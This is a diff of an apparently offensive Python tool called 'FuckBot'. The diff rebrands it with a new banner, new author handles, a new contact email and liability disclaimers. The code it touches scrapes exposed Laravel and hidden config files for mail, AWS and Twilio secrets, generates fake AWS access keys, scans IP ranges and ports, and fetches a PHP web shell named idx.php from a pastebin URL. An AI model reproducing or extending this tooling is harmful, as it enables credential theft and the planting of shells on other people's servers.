@@ -23,7 +23,6 @@ import smtplib
 import email.utils
 import configparser
 import subprocess
-
 import twilio.rest
 import botocore
 import boto3
@@ -103,9 +102,9 @@ if not os.path.exists("FuckBot.ini"):
     parser.set("shell", "shell_url", "https://pastebin.com/raw/C5zzy6r4")
     parser.set("shell", "shell_name", "idx.php")
     parser.add_section("aws")
-    parser.set("aws", "email", "misterxidgoid@gmail.com")
+    parser.set("aws", "email", "bmarket01@yahoo.com")
     parser.add_section("email")
-    parser.set("email", "your_mail", "misterxidgoid@gmail.com")
+    parser.set("email", "your_mail", "bmarket01@yahoo.com")
     
     with open("FuckBot.ini", "w") as fp:
         parser.write(fp)
@@ -193,27 +192,31 @@ class FuckBot:
         
     def __init__(self):
         
-        self.show_info_message("Starting bot!")
+        self.show_info_message("Starting Engine!")
         time.sleep(1)
         
         print("\n")
-        print(Color.RED("__    __  _______   ________  _______    ______  ________ "))
-        print(Color.RED("|  \  /  \|       \ |        \|       \  /      \|        \ "))
-        print(Color.RED("| $$ /  $$| $$$$$$$\ \$$$$$$$$| $$$$$$$\|  $$$$$$\\$$$$$$$$"))
-        print(Color.RED("| $$/  $$ | $$__| $$    /  $$ | $$__/ $$| $$  | $$  | $$"))
-        print(Color.RED("| $$  $$  | $$    $$   /  $$  | $$    $$| $$  | $$  | $$"))
-        print(Color.RED("| $$$$$\  | $$$$$$$\  /  $$   | $$$$$$$\| $$  | $$  | $$"))
-        print(Color.RED("| $$ \$$\ | $$  | $$ /  $$___ | $$__/ $$| $$__/ $$  | $$"))
-        print(Color.RED("| $$  \$$\| $$  | $$|  $$    \| $$    $$ \$$    $$  | $$"))
-        print(Color.RED(" \$$   \$$ \$$   \$$ \$$$$$$$$ \$$$$$$$   \$$$$$$    \$$"))
+        print(Color.RED("╭━━━╮╱╱╱╱╱╭╮╱╭━━╮╱╱╱╭╮"))
+        print(Color.RED("┃╭━━╯╱╱╱╱╱┃┃╱┃╭╮┃╱╱╭╯╰╮"))
+        print(Color.RED("┃╰━━┳╮╭┳━━┫┃╭┫╰╯╰┳━┻╮╭╯"))
+        print(Color.RED("┃╭━━┫┃┃┃╭━┫╰╯┫╭━╮┃╭╮┃┃"))
+        print(Color.RED("┃┃╱╱┃╰╯┃╰━┫╭╮┫╰━╯┃╰╯┃╰╮"))
+        print(Color.RED("╰╯╱╱╰━━┻━━┻╯╰┻━━━┻━━┻━╯"))
+        print(Color.RED("Developed By") + ": " + Color.BLUE("@J3mBotMaw0ttz"))
+        print(Color.RED("Contact") + ": " + Color.BLUE("@buffer_0x0verfl0w"))
         print("\n")
         
 
-        
+        self.show_warning_message(
+            message="Use with caution. You are responsible for your actions"
+        )
+        self.show_warning_message(
+            message="Developer assume no liability and are not responsible for any misuse or damage."
+        )
         
         list_desc = {
             
-            "1": ["IP Address Generator", "[PRIV8]"],
+            "1": ["Random IP Address Generator", "Custom Total"],
             "2": ["Random IP Address Generator with IP Range", "192.168.0.0-192.168.255.255"],
             "3": ["HTTP IP Address Checker With Port Scanner", "Port 80"],
             "4": ["AWS API Key Generator", "Custom Total"],
@@ -238,16 +241,12 @@ class FuckBot:
             "23": ["Exit Program", "Exit Bot"],
             
             }
-
-        self.show_info_message(message="Private bot by, Mohammedkairz\n")
+            
+        self.show_info_message(message="Loading Bot List....\n")
         time.sleep(1)
-        self.show_info_message(message="More priv8 tools , telegrams @krztools\n")
-        time.sleep(0.5)
-        self.show_info_message(message="thanks for using tools.\n")
-        time.sleep(2)
         table = Table(show_header=True, header_style="bold magenta")
-        table.add_column("Number")
-        table.add_column("List")
+        table.add_column("Choice Number")
+        table.add_column("Bot Description")
         
         for num, desc in list_desc.items():
             table.add_row("[" + Color.GREEN(num) + "]", Color.CYAN(desc[0]) + " " + "[" + Color.RED(desc[1]) + "]")
@@ -822,6 +821,7 @@ class FuckBot:
                         mode="Laravel Validator",
                     )
                     self.write_file(live_list, target_url)
+                    
                 else:
                     get_config = requests.post(
                         url=target_url,
@@ -842,6 +842,7 @@ class FuckBot:
                             mode="Laravel Validator",
                         )
                         self.write_file(live_list, target_url)
+                        
                         
                     else:
                         
@@ -1123,6 +1124,7 @@ class FuckBot:
                     
                     try:
                         mail_host = re.findall("MAIL_HOST=(.*)", config_value)[0]
+                        
                     except:
                         mail_host = "-"
                         
@@ -1161,6 +1163,7 @@ class FuckBot:
                         
                         try:
                             mail_host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", config_value)[0]
+                           
                         except:
                             mail_host = "-"
                             
@@ -1791,6 +1794,7 @@ class FuckBot:
                                             mode="Hidden Config Scanner"
                                         )
                                         self.write_file(result_aws, url_config)
+                                        
                                     elif "TWILIO" in get_config.text or "twilio" in get_config.text:
                                         self.show_status_message(
                                             time=time_now,counter=counter,
@@ -2417,6 +2421,7 @@ class FuckBot:
     def aws_generator(self, length, region):
         
         chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]
+        chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"]
         
         def aws_id():
             output = "AKIA"
@@ -3458,7 +3463,7 @@ class FuckBot:
 
                     self.write_file(config_raw, self.join_string(build))
                     self.write_file(config_vuln, url_config)
-
+                    
                 else:
                     get_config = requests.post(
                         url=target_url,
@@ -3474,6 +3479,7 @@ class FuckBot:
                         config_value = get_config.content.decode(encoding="utf-8", errors="ignore")
                         
                         self.write_file(config_vuln, target_url)
+                        
                     else:
                         config_value = False
 
